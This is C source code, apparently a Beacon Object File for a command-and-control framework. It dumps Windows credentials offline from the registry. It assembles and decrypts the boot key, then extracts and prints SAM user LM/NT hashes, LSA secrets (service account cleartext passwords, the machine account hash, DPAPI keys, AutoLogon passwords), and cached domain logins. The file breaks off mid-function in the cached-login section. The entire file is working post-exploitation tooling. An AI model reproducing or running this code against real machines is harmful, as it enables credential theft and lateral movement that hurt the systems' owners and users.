#include "include.h"
#include "crypto.c"

// Globals
formatp pOutBuf         = { 0 };
formatp pHashcatBuf     = { 0 };
BOOL    bHashcatOut     = FALSE;
UCHAR   BootKey[16]     = { 0 };
UCHAR   EncBootKey[16]  = { 0 };
SIZE_T  szKfi           = sizeof(KEY_FULL_INFORMATION) + 256;    
SIZE_T  szKbi           = sizeof(KEY_BASIC_INFORMATION) + 256;
SIZE_T  szKvbi          = sizeof(KEY_VALUE_BASIC_INFORMATION) + 256;

VOID SizeAndFreeBuffer(PPVOID pBuffer)
{
    memset(*pBuffer, 0, _msize(*pBuffer));
    free(*pBuffer);
    *pBuffer = NULL;

    return;
}

VOID CloseHandleAndWipePointer(PHANDLE pHandle)
{
    NtClose(*pHandle);
    *pHandle = NULL;

    return;
}

BOOL IsPrivilegeEnabled() 
{
    HANDLE        hToken = { 0 };
    LUID          luid = { 0 };
    PRIVILEGE_SET privSet = { 0 };
    BOOL          bResult = FALSE;

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken))
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        {
            BeaconFormatPrintf(&pOutBuf, "[-] %s: OpenProcessToken failed: %lu\n", __func__, GetLastError());
            return bResult;
        }

    if (!LookupPrivilegeValueA(NULL, "SeBackupPrivilege", &luid)) 
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: LookupPrivilegeValue failed: %lu\n", __func__, GetLastError());
        CloseHandle(hToken);
        return bResult;
    }

    privSet.PrivilegeCount = 1;
    privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privSet.Privilege[0].Luid = luid;
    privSet.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!PrivilegeCheck(hToken, &privSet, &bResult)) 
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: PrivilegeCheck failed: %lu\n", __func__, GetLastError());
        CloseHandle(hToken);
        return bResult;
    }

    CloseHandle(hToken);
    return bResult;
}

HANDLE OpenRegKey(LPWSTR lpKeyToOpen)
{
    HANDLE            hKey     = { 0 };
    UNICODE_STRING    keyPath  = { 0 };
    OBJECT_ATTRIBUTES objAttrs = { 0 };
    NTSTATUS          status   = { 0 };

    // Initialize OBJECT_ATTRIBUTES
    RtlInitUnicodeString(&keyPath, lpKeyToOpen);
    InitializeObjectAttributes(&objAttrs, &keyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Open key
    if ((status = NtOpenKeyEx(&hKey, KEY_READ, &objAttrs, REG_OPTION_BACKUP_RESTORE)) != STATUS_SUCCESS)
        BeaconFormatPrintf(&pOutBuf, "[-] %s: NtOpenKeyEx for %ls failed: Status: 0x%08lX\n", __func__, lpKeyToOpen, status);

    return hKey;
}

PVOID GetRegValue(HANDLE hKey, LPWSTR QueryKey, PDWORD dwValLen)
{
    PVOID   pResult  = { 0 };
    DWORD   dwReqLen = { 0 };
    VALENTW val[1]   = { 0 };
    LSTATUS status   = { 0 };

    // Set name of value we are querying
    val->ve_valuename = QueryKey;

    // First call to determine required buffer size and allocate
    // If we fail for another reason here, like the value doesn't exist, silently return
    // Let caller handle this is expected behavior in some cases and not always worthy of reporting an error
    if (RegQueryMultipleValuesW(hKey, val, 1, NULL, &dwReqLen) != ERROR_MORE_DATA)
        return pResult;

    // Allocate a buffer
    pResult = calloc(1, dwReqLen);

    // Store length of buffer if it was requested
    if (dwValLen)
        *dwValLen = dwReqLen;

    // Second call gets true value
    if ((status = RegQueryMultipleValuesW(hKey, val, 1, pResult, &dwReqLen)) != ERROR_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: RegQueryMultipleValuesW for value %s failed: Status: 0x%08lX\n", __func__, QueryKey, status);
        SizeAndFreeBuffer((PPVOID)&pResult);
    }

    return pResult;
}

// Helper function to get encrypted boot key
BOOL GetBootKey(PUCHAR EncBootKey)
{
    HKEY                  hKey             = { 0 };
    WCHAR                 *values[]        = {L"JD", L"Skew1", L"GBG", L"Data"};
    WCHAR                 SubKey[256]      = { 0 };
    UCHAR                 Indices[16]      = {0x8, 0x5, 0x4, 0x2, 0xB, 0x9, 0xD, 0x3, 0x0, 0x6, 0x1, 0xC, 0xE, 0xA, 0xF, 0x7};
    UCHAR                 BootKeyParts[16] = { 0 };
    ULONG                 uReqLen          = { 0 };
    PKEY_NODE_INFORMATION pKeyNodeInfo     = { 0 };
    NTSTATUS              status           = { 0 };

    // Iterate over the four subkeys (values)
    for (DWORD i = 0; i < 4; i++)
    {
        status = STATUS_UNSUCCESSFUL;

        // Assemble path to key to open
        _swprintf(SubKey, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\%ls", values[i]);
        if (!(hKey = OpenRegKey(SubKey)))
        {
            BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to open %ls key required to assemble boot key\n", __func__, SubKey);
            goto cleanuploop;
        }

        // Get required buffer size
        NtQueryKey(hKey, KeyNodeInformation, NULL, 0, &uReqLen);

        // Allocate buffer and make real call to retrieve information
        pKeyNodeInfo = (PKEY_NODE_INFORMATION)calloc(1, uReqLen);
        if ((status = NtQueryKey(hKey, KeyNodeInformation, pKeyNodeInfo, uReqLen, &uReqLen)) != STATUS_SUCCESS)
        {
            BeaconFormatPrintf(&pOutBuf, "[-] %s: NtQueryKey failed: Status: 0x%08lX\n", __func__, status);
            goto cleanuploop;
        }

        if (pKeyNodeInfo->ClassLength > 0)
        {
            // Xtra * 2 and / 2 in here from AdaptixC2 example since we are using NtQueryKey instead of RegQueryInfoKeyW to get ClassValue + ClassValueSize
            for( INT j = 0; j < pKeyNodeInfo->ClassLength / sizeof(WCHAR) / 2; j++)
                swscanf_s(PADD(pKeyNodeInfo, pKeyNodeInfo->ClassOffset, j * 2 * sizeof(WCHAR)), L"%2hhx", PADD(BootKeyParts, i * 4, j)); 
        }

cleanuploop:
        if (pKeyNodeInfo)
        {
            memset(pKeyNodeInfo, 0, uReqLen);
            free(pKeyNodeInfo);
        }
        if (hKey)
            CloseHandleAndWipePointer((PHANDLE)&hKey);

        if (status != STATUS_SUCCESS)
            return FALSE;
    }

    // Permute boot key
    for (DWORD i = 0; i < 16; i++)
        EncBootKey[i] = BootKeyParts[Indices[i]];

    return TRUE;
}

PVOID GetSystemKey()
{
    HANDLE hKey       = { 0 };
    PVOID  pSystemKey = { 0 };
    
    if ((hKey = OpenRegKey(L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account")))
    {
        pSystemKey = GetRegValue(hKey, L"F", NULL);
        CloseHandleAndWipePointer((PHANDLE)&hKey);
    }

    return pSystemKey;
}

// Note that the Rc4
BOOL DecryptBootKey(PUCHAR EncBootKey, PDOMAIN_ACCOUNT_F pFData, PUCHAR BootKey)
{
    PSAM_KEY_DATA_AES pKey1AES      = { 0 };    

    // RC4 encryption
    if (pFData->keys1.Revision == 1)
    {
        // TODO
        // Can just reference using pFData->keys1.X
        BeaconFormatPrintf(&pOutBuf, "[-] RC4 hashing not currently supported\n");
    }
    // AES encryption
    else if (pFData->keys1.Revision == 2)
    {
        // Version two uses SAM_KEY_DATA_AES structs instead, so cast keys1 to this type and access via local var
        pKey1AES = (PSAM_KEY_DATA_AES)&pFData->keys1;
        return DecryptAES(EncBootKey, 16, pKey1AES->Salt, 16, pKey1AES->data, 16, BootKey, BCRYPT_CHAIN_MODE_CBC);
    }
    // Oh dear...
    else
        BeaconFormatPrintf(&pOutBuf, "[-] %s: This tool does not support this version of Windows\n", __func__);

    return FALSE;
}

BOOL DumpBootKeys()
{
    PDOMAIN_ACCOUNT_F pSystemKey    = { 0 };
    BOOL              bSuccess      = FALSE;

    // Get Boot key
    //BeaconFormatPrintf(&pOutBuf, "====================================== BOOT KEYS =====================================\n");
    if (!GetBootKey(EncBootKey))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to get encrypted boot key\n", __func__);
        goto cleanup;
    }

    // BeaconFormatPrintf(&pOutBuf, "EncBootKey: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n",
    //                                 EncBootKey[0], EncBootKey[1], EncBootKey[2], EncBootKey[3],
    //                                 EncBootKey[4], EncBootKey[5], EncBootKey[6], EncBootKey[7],
    //                                 EncBootKey[8], EncBootKey[9], EncBootKey[10], EncBootKey[11],
    //                                 EncBootKey[12], EncBootKey[13], EncBootKey[14], EncBootKey[15]);

    // Get System key
    if (!(pSystemKey = (PDOMAIN_ACCOUNT_F)GetSystemKey()))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to get system key\n", __func__);
        goto cleanup;
    }

    // Decrypt Boot key
    if (!DecryptBootKey(EncBootKey, pSystemKey, BootKey))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to decrypt boot key\n", __func__);
        goto cleanup;
    }

    // BeaconFormatPrintf(&pOutBuf, "BootKey: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x\n",
    //                                 BootKey[0], BootKey[1], BootKey[2], BootKey[3],
    //                                 BootKey[4], BootKey[5], BootKey[6], BootKey[7],
    //                                 BootKey[8], BootKey[9], BootKey[10], BootKey[11],
    //                                 BootKey[12], BootKey[13], BootKey[14], BootKey[15]);

    // If we reach the end, set status success
    bSuccess = TRUE;

cleanup:
    // Wipe sensitive heap values and free allocations
    if (pSystemKey)
        SizeAndFreeBuffer((PPVOID)&pSystemKey);

    return bSuccess;
}

PNT6_CLEAR_SECRET DumpSecret(LPWSTR lpKeyToOpen, PVOID pKey, DWORD dwKeyLen)
{
    HANDLE            hKey                = { 0 };
    PNT6_HARD_SECRET  pRegSecret          = { 0 };
    PNT6_CLEAR_SECRET pDecryptedRegSecret = { 0 };
    UCHAR             TempKey[32]         = { 0 };
    DWORD             dwRegValLen         = { 0 };
    DWORD             dwRegSecretLen      = { 0 };

    // Open key
    if (!(hKey = OpenRegKey(lpKeyToOpen)))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to open key\n", __func__);
        goto cleanup;
    }

    // Retrieve PNT6_HARD_SECRET
    if (!(pRegSecret = (PNT6_HARD_SECRET)GetRegValue(hKey, L"", &dwRegValLen)))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to retrieve registry value\n", __func__);
        goto cleanup;   
    }

    // Calculate SHA256 hash
    if (!ComputeSha256(pKey, dwKeyLen, pRegSecret->lazyiv, TempKey))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to compute SHA256 hash value\n", __func__);
        goto cleanup;  
    }

    // AES ECB decrypt secret. Provide PNT6_HARD_SECRET -> returns PNT6_CLEAR_SECRET
    dwRegSecretLen = dwRegValLen - FIELD_OFFSET(NT6_HARD_SECRET, encryptedSecret);
    pDecryptedRegSecret = (PNT6_CLEAR_SECRET)calloc(1, dwRegSecretLen);
    if (!DecryptAES(TempKey, 32, NULL, 0, pRegSecret->encryptedSecret, dwRegSecretLen, (PBYTE)pDecryptedRegSecret, BCRYPT_CHAIN_MODE_ECB))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: AES decryption of LSA secret failed\n", __func__);
        SizeAndFreeBuffer((PPVOID)&pDecryptedRegSecret);
        goto cleanup;
    }

cleanup:
    // Wipe sensitive stack values
    memset(TempKey, 0, 32);

    // Wipe sensitive heap values and free allocations
    if (pRegSecret)
        SizeAndFreeBuffer((PPVOID)&pRegSecret); 

    // Close other handles / keys
    if (hKey)
        CloseHandleAndWipePointer((PHANDLE)&hKey);

    return pDecryptedRegSecret;
}

PVOID GetKBIs(LPWSTR lpKeyToOpen, PDWORD dwNumStructs, BOOL bSubkeys)
{
    HANDLE   hKey        = { 0 };
    NTSTATUS status      = { 0 };
    PVOID    pKFI        = { 0 };
    PVOID    pInfo       = { 0 };
    ULONG    uReqLen     = { 0 };

    // Open key
    if(!(hKey = OpenRegKey(lpKeyToOpen)))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to open key\n", __func__);
        goto cleanup;
    }

    // Query full information about the registry key in question
    pKFI = calloc(1, szKfi);
    if ((status = NtQueryKey(hKey, 2, pKFI, szKfi, &uReqLen)) != STATUS_SUCCESS )
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: NtQueryKey failed: Status: 0x%08lX\n", __func__, status);
        goto cleanup;
    }

    // Assign and create number of structs based on whether we are querying subkeys or values
    if (bSubkeys)
    {
        *dwNumStructs = ((PKEY_FULL_INFORMATION)pKFI)->SubKeys;
        pInfo = calloc(*dwNumStructs, szKbi);
    }
    else
    {
        *dwNumStructs = ((PKEY_FULL_INFORMATION)pKFI)->Values;
        pInfo = calloc(*dwNumStructs, szKvbi); 
    }
     
    // Loop over each subkey/value and extract required data
    for (ULONG index = 0; index < *dwNumStructs; index++)
    {
        if (bSubkeys)
        {
            // Retrieve subkey information
            if ((status = NtEnumerateKey(hKey, index, KeyBasicInformation, PADD(pInfo, index * szKbi), szKbi, &uReqLen)) != STATUS_SUCCESS )
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: NtEnumerateKey failed: Status: 0x%08lX\n", __func__, status);
                SizeAndFreeBuffer((PPVOID)&pInfo);
                goto cleanup;
            }
        }
        else
        {
            // Retrieve value information
            if ((status = NtEnumerateValueKey(hKey, index, KeyValueBasicInformation, PADD(pInfo, index * szKvbi), szKvbi, &uReqLen)) != STATUS_SUCCESS )
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: NtEnumerateValueKey failed: Status: 0x%08lX\n", __func__, status);
                SizeAndFreeBuffer((PPVOID)&pInfo);
                goto cleanup;
            }
        }
    }

cleanup:
    // Wipe sensitive heap values and free allocations
    if (pKFI)
        SizeAndFreeBuffer((PPVOID)&pKFI); 

    // Close other handles / keys
    if (hKey)
        CloseHandleAndWipePointer((PHANDLE)&hKey);

    return pInfo;
}

BOOL DumpSamSecrets()
{
    DWORD                  dwNumUsersSubkeys = { 0 };
    BOOL                   bSuccess = FALSE;
    BOOL                   bUserSuccess = FALSE;
    HANDLE                 hKey = { 0 };
    DWORD                  dwNumUsers = { 0 };
    PKEY_BASIC_INFORMATION pKBI = { 0 };
    PKEY_BASIC_INFORMATION pUserKeyInfo = { 0 };
    PUSER_V*               pValues = { 0 };
    PULONG                 pRids = { 0 };
    WCHAR                  UserKey[256] = { 0 };
    WCHAR                  Username[256] = { 0 };
    UCHAR                  EncUserLMHash[16] = { 0 };
    UCHAR                  EncUserNTHash[16] = { 0 };
    UCHAR                  UserLMHash[16] = { 0 };
    UCHAR                  UserNTHash[16] = { 0 };
    // PSAM_HASH              pSamHash_LM = { 0 }; // TODO
    // PSAM_HASH              pSamHash_NT = { 0 }; // TODO
    PSAM_HASH_AES          pSamHashAES_LM = { 0 };
    PSAM_HASH_AES          pSamHashAES_NT = { 0 };
    WORD                   SAMRevision = { 0 };
    UCHAR                  DefaultHashLM[] = { 0xAA, 0xD3, 0xB4, 0x35, 0xB5, 0x14, 0x04, 0xEE, 0xAA, 0xD3, 0xB4, 0x35, 0xB5, 0x14, 0x04, 0xEE };
    UCHAR                  DefaultHashNT[] = { 0x31, 0xD6, 0xCF, 0xE0, 0xD1, 0x6A, 0xE9, 0x31, 0xB7, 0x3C, 0x59, 0xD7, 0xE0, 0xC0, 0x89, 0xC0 };
    WCHAR                  ExtraOut[255] = { 0 };

    // Retrieve array of KEY_BASIC_INFORMATION structs representing the users on the machine. TRUE == SubKeys
    if (!(pKBI = GetKBIs(L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users", &dwNumUsersSubkeys, TRUE)))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to enumerate Users subkeys\n", __func__);
        goto cleanup;  
    }

    // Allocate buffers
    pRids = calloc(dwNumUsersSubkeys, sizeof(ULONG));
    pValues = calloc(dwNumUsersSubkeys, sizeof(PVOID));

    // Loop through and collect the "V" value from each user key
    for (DWORD subkey = 0; subkey < dwNumUsersSubkeys; subkey++)
    {
        // Assign ptr for ease
        pUserKeyInfo = (PKEY_BASIC_INFORMATION)PADD(pKBI, subkey * szKbi);

        // We only want the ones beginning with 00000
        if (wcsstr(pUserKeyInfo->Name, L"00000"))
        {
            // Assemble new key path and open
            _swprintf(UserKey, L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\%ls", pUserKeyInfo->Name);
            hKey = OpenRegKey(UserKey);

            // Convert and store user RID
            pRids[subkey] = wcstoul(pUserKeyInfo->Name, NULL, 16);

            // Query and store the "V" string
            if (!(pValues[subkey] = (PUSER_V)GetRegValue(hKey, L"V", NULL)))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to retrieve registry value for index: %u\n", __func__, subkey);
                goto cleanup;
            }

            // Close user key
            CloseHandleAndWipePointer((PHANDLE)&hKey);
            dwNumUsers++;
        }

        memset(UserKey, 0, sizeof(UserKey));
    }

    // Loop over each extracted data string (each of which represents a user account)
    BeaconFormatPrintf(&pOutBuf, "====================================== HASHDUMP ======================================\n");
    for (DWORD user = 0; user < dwNumUsers; user++)
    {
        // Parse username
        memcpy(Username, PADD(pValues[user]->data, pValues[user]->username_ofs), pValues[user]->username_len);

        // Check length of nt hash, as users can apparently have an "empty" hash
        if (pValues[user]->ntpw_len <= 0x18)
        {
            _swprintf(ExtraOut, L"- BLANK PASSWORD");
            memcpy(UserLMHash, DefaultHashLM, 16);
            memcpy(UserNTHash, DefaultHashNT, 16);
            bUserSuccess = TRUE;            
            goto enduser;
        }

        // Check version of SAM Hash
        SAMRevision = ((PSAM_HASH)PADD(pValues[user]->data, pValues[user]->ntpw_ofs))->Revision;
        
        // TODO legacy RC4
        if (SAMRevision == 1)
        {
            BeaconFormatPrintf(&pOutBuf, "[-] RC4 hashing not currently supported, skipping\n");
        }
        // AES
        else if (SAMRevision == 2)
        {
            // Decrypt LM hash if present
            if (pValues[user]->lmpw_len > 0)
            {
                pSamHashAES_LM = (PSAM_HASH_AES)PADD(pValues[user]->data, pValues[user]->lmpw_ofs);
                if (!DecryptAES(BootKey, 16, pSamHashAES_LM->Salt, 16, pSamHashAES_LM->data, 16, EncUserLMHash, BCRYPT_CHAIN_MODE_CBC))
                {
                    BeaconFormatPrintf(&pOutBuf, "[-] %s: User %ls: AES decryption of user LM hash failed\n", __func__, Username);                
                    goto enduser;
                }

                if (!DecryptHashWithRid(pRids[user], EncUserLMHash, UserLMHash))
                {
                    BeaconFormatPrintf(&pOutBuf, "[-] %s: User %ls: DES decryption of user LM hash failed\n", __func__, Username);                
                    goto enduser;     
                }
            }
            // Otherwise use default LM hash
            else
                memcpy(UserLMHash, DefaultHashLM, 16);

            // Decrypt NT hash
            pSamHashAES_NT = (PSAM_HASH_AES)PADD(pValues[user]->data, pValues[user]->ntpw_ofs);
            if (!DecryptAES(BootKey, 16, pSamHashAES_NT->Salt, 16, pSamHashAES_NT->data, 16, EncUserNTHash, BCRYPT_CHAIN_MODE_CBC))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: User %ls: AES decryption of user NT hash failed\n", __func__, Username);                
                goto enduser;
            }

            if (!DecryptHashWithRid(pRids[user], EncUserNTHash, UserNTHash))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: User %ls: DES decryption of user NT hash failed\n", __func__, Username);                
                goto enduser;     
            }

            bUserSuccess = TRUE;
        }
        else
        {
            BeaconFormatPrintf(&pOutBuf, "[-] %s: User %ls: Unsupported SAM Hash type: %hu\n", __func__, Username, SAMRevision);
            goto enduser;
        }

enduser:
        if (bUserSuccess)
            BeaconFormatPrintf(&pOutBuf, "%ls:%d:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x %ls\n", Username, pRids[user],
                                            UserLMHash[0], UserLMHash[1], UserLMHash[2], UserLMHash[3],
                                            UserLMHash[4], UserLMHash[5], UserLMHash[6], UserLMHash[7],
                                            UserLMHash[8], UserLMHash[9], UserLMHash[10], UserLMHash[11],
                                            UserLMHash[12], UserLMHash[13], UserLMHash[14], UserLMHash[15],
                                            UserNTHash[0], UserNTHash[1], UserNTHash[2], UserNTHash[3],
                                            UserNTHash[4], UserNTHash[5], UserNTHash[6], UserNTHash[7],
                                            UserNTHash[8], UserNTHash[9], UserNTHash[10], UserNTHash[11],
                                            UserNTHash[12], UserNTHash[13], UserNTHash[14], UserNTHash[15], ExtraOut);

        // Reset vars for next time
        memset(Username, 0, sizeof(Username));
        memset(UserNTHash, 0, 16);
        memset(UserLMHash, 0, 16);
        memset(EncUserLMHash, 0, 16);
        memset(EncUserNTHash, 0, 16);
        memset(ExtraOut, 0, sizeof(ExtraOut));
        bUserSuccess = FALSE;
    }

    // If we reach the end, set status success
    bSuccess = TRUE;

cleanup:
    // Wipe sensitive heap values and free allocations
    if (pKBI)
        SizeAndFreeBuffer((PPVOID)&pKBI);
    if (pRids)
        SizeAndFreeBuffer((PPVOID)&pRids);
    if (pValues)
    {
        for (DWORD i = 0; i < dwNumUsers; i++)
            if (pValues[i])
                SizeAndFreeBuffer((PPVOID)&pValues[i]); 

        SizeAndFreeBuffer((PPVOID)&pValues); 
    }

    // Close other handles / keys
    if (hKey)
        CloseHandleAndWipePointer((PHANDLE)&hKey);

    return bSuccess;
}

BOOL DumpSecuritySecrets()
{
    BOOL                         bSuccess            = FALSE;
    HANDLE                       hKey                = { 0 };
    PNT6_CLEAR_SECRET            pDecryptedLsaBuf    = { 0 };
    PNT6_CLEAR_SECRET            pNLKMKey            = { 0 };
    PVOID                        pLsaKey             = { 0 };            
    DWORD                        dwLsaKeyLen         = { 0 };
    DWORD                        dwNumVals           = { 0 };
    DWORD                        dwNumKeys           = { 0 };    
    DWORD                        dwRegValLen         = { 0 };
    DWORD                        dwEncDataLen        = { 0 };
    PDWORD                       pdwIterationVal     = { 0 };
    DWORD                        dwIteration         = 10240;
    PKEY_VALUE_BASIC_INFORMATION pKVBI               = { 0 };
    PKEY_VALUE_BASIC_INFORMATION pCacheValueInfo     = { 0 };
    PMSCACHE_ENTRY*              pCacheVals          = { 0 };
    PNT6_CLEAR_SECRET*           pSecrets            = { 0 };
    PKEY_BASIC_INFORMATION       pSecretKeys         = { 0 };    
    PKEY_BASIC_INFORMATION       pSecretKeyInfo      = { 0 };    
    PMSCACHE_DATA                pMSCACHE_DATA       = { 0 };
    MSCACHE_ENTRY_PTR            UserEntry           = { 0 };
    WCHAR                        HashPrefix[64]      = { 0 };
    WCHAR                        SecretKeyName[255]  = { 0 };
    WCHAR                        AddKeyName[255]     = { 0 };
    PWCHAR                       pServiceAccName     = { 0 };
    PWCHAR                       pDomain             = { 0 };
    PWCHAR                       pHostname           = { 0 };
    UCHAR                        MachineHash[16]     = { 0 };

    // Decrypt LSA Secret
    if (!(pDecryptedLsaBuf = DumpSecret(L"\\Registry\\Machine\\SECURITY\\Policy\\PolEKList", EncBootKey, sizeof(EncBootKey))))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to decrypt LSA secret, unable to proceed further\n", __func__);
        goto cleanup;  
    }

    // Assign pointer to LSA key and its size via the NT6_CLEAR_SECRET -> NT_SYSTEM_KEYS -> NT_SYSTEM_KEY -> Key/KeySize members
    pLsaKey = ((PNT6_SYSTEM_KEY)&((PNT6_SYSTEM_KEYS)((PNT6_CLEAR_SECRET)pDecryptedLsaBuf)->Secret)->Keys[0])->Key;
    dwLsaKeyLen = ((PNT6_SYSTEM_KEY)&((PNT6_SYSTEM_KEYS)((PNT6_CLEAR_SECRET)pDecryptedLsaBuf)->Secret)->Keys[0])->KeySize;

    // Retrieve array of KEY_BASIC_INFORMATION structs representing the secrets on the machine. TRUE == SubKeys
    if (!(pSecretKeys = GetKBIs(L"\\Registry\\Machine\\SECURITY\\Policy\\Secrets", &dwNumKeys, TRUE)))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to enumerate Users subkeys\n", __func__);
        goto cleanup;  
    }

    // Allocate buffers
    pSecrets = calloc(dwNumKeys, sizeof(PVOID));

    // Loop through and process the secrets
    BeaconFormatPrintf(&pOutBuf, "\n==================================== LSA SECRETS =====================================\n");    
    for (DWORD secret = 0; secret < dwNumKeys; secret++)
    {
        // Assign ptr for ease
        pSecretKeyInfo = (PKEY_BASIC_INFORMATION)PADD(pSecretKeys, secret * szKbi);

        // Dump secret
        _swprintf(SecretKeyName, L"\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\%ls\\CurrVal", pSecretKeyInfo->Name);
        if (!(pSecrets[secret] = DumpSecret(SecretKeyName, pLsaKey, dwLsaKeyLen)))
        {
            BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to dump %ls secret\n", __func__, pSecretKeyInfo->Name);
            goto cleanup;  
        }

        // We now branch based on which kind of secret it is
        // Service account
        if (wcsstr(pSecretKeyInfo->Name, L"_SC_") != 0)
        {
            // Open service key (PADD to skip _SC_ in name)
            _swprintf(AddKeyName, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%ls", PADD(pSecretKeyInfo->Name, 4 * sizeof(WCHAR)));
            if (!(hKey = OpenRegKey(AddKeyName)))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to open service key\n", __func__);
                goto cleanup;
            }

            // Query and store the username of the service account
            if (!(pServiceAccName = (PWCHAR)GetRegValue(hKey, L"ObjectName", NULL)))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to retrieve service information\n", __func__);
                goto cleanup;
            }

            // Close key
            CloseHandleAndWipePointer((PHANDLE)&hKey);
            
            // Report secret
            BeaconFormatPrintf(&pOutBuf, "Service account credentials: %ls:%.*ls\n", pServiceAccName, pSecrets[secret]->SecretSize / sizeof(WCHAR), pSecrets[secret]->Secret);
        }
        else if (wcsstr(pSecretKeyInfo->Name, L"$MACHINE.ACC") != 0 )
        {
            // Open key to retrieve domain/hostname
            _swprintf(AddKeyName, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters");
            if (!(hKey = OpenRegKey(AddKeyName)))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to open service key\n", __func__);
                goto cleanup;
            }

            // Query and store the domain
            if (!(pDomain = (PWCHAR)GetRegValue(hKey, L"Domain", NULL)))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to retrieve service information\n", __func__);
                goto cleanup;
            }

            // Query and store the hostname
            if (!(pHostname = (PWCHAR)GetRegValue(hKey, L"Hostname", NULL)))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to retrieve service information\n", __func__);
                goto cleanup;
            }

            // Close key
            CloseHandleAndWipePointer((PHANDLE)&hKey);

            // Calculate machine hash
            if (!ComputeMd4Hash(pSecrets[secret]->Secret, pSecrets[secret]->SecretSize, MachineHash))
            {
                BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to transform machine account hash\n", __func__);
                goto cleanup; 
            }

            // Report secret
            BeaconFormatPrintf(&pOutBuf, "Machine Account: %ls\\%ls$:aad3b435b51404eeaad3b435b51404ee:", pDomain, pHostname);  
            for (DWORD b = 0; b < LM_NTLM_HASH_LENGTH; b++)
                BeaconFormatPrintf(&pOutBuf, "%02x", MachineHash[b]);
            BeaconFormatPrintf(&pOutBuf, "\n");
        }
        else if (wcsstr(pSecretKeyInfo->Name, L"DPAPI_SYSTEM") != 0 )
        {
            // Report secrets
            BeaconFormatPrintf(&pOutBuf, "DPAPI MachineKey: ");
            for (DWORD b = 0; b < SHA_DIGEST_LENGTH; b++)
                BeaconFormatPrintf(&pOutBuf, "%02x", pSecrets[secret]->Secret[sizeof(DWORD) + b]);
            BeaconFormatPrintf(&pOutBuf, "\n");
            
            BeaconFormatPrintf(&pOutBuf, "DPAPI UserKey: ");
            for (DWORD b = 0; b < SHA_DIGEST_LENGTH; b++)
                BeaconFormatPrintf(&pOutBuf, "%02x", pSecrets[secret]->Secret[sizeof(DWORD) + SHA_DIGEST_LENGTH + b]);
            BeaconFormatPrintf(&pOutBuf, "\n");
        }
        else if (wcsstr(pSecretKeyInfo->Name, L"DefaultPassword") != 0 )
        {
            // Check size of secret and report if > 0
            if (pSecrets[secret]->SecretSize)
                BeaconFormatPrintf(&pOutBuf, "AutoLogon default password: %.*ls\n", pSecrets[secret]->SecretSize / sizeof(WCHAR), pSecrets[secret]->Secret);
        }
        else if (wcsstr(pSecretKeyInfo->Name, L"NL$KM") == 0 )
            BeaconFormatPrintf(&pOutBuf, "Unsupported secret, consider submitting a PR ;): %ls\n", pSecretKeyInfo->Name);

        // Reset vars for next loop
        memset(SecretKeyName, 0, sizeof(SecretKeyName));
        memset(AddKeyName, 0, sizeof(AddKeyName));
    }

    // Open NL$KM key, which only exists on Domain-joined machines
    if (!(pNLKMKey = DumpSecret(L"\\Registry\\Machine\\SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal", pLsaKey, dwLsaKeyLen)))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to dump NLKM key, skipping domain-related enumerations\n", __func__);
        bSuccess = TRUE;
        goto cleanup;  
    }
    else
        BeaconFormatPrintf(&pOutBuf, "\n=============================== CACHED DOMAIN LOGINS =================================\n");

    // Open key to query values
    if (!(hKey = OpenRegKey(L"\\Registry\\Machine\\SECURITY\\Cache")))
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to open Cache to read values\n", __func__);
        goto cleanup;
    }

    // Set hash prefix based on value/absence of NL$IterationCount value in cache key
    if ((pdwIterationVal = (PDWORD)GetRegValue(hKey, L"NL$IterationCount", NULL)))
    {
        dwIteration = *pdwIterationVal;
        if (!dwIteration)
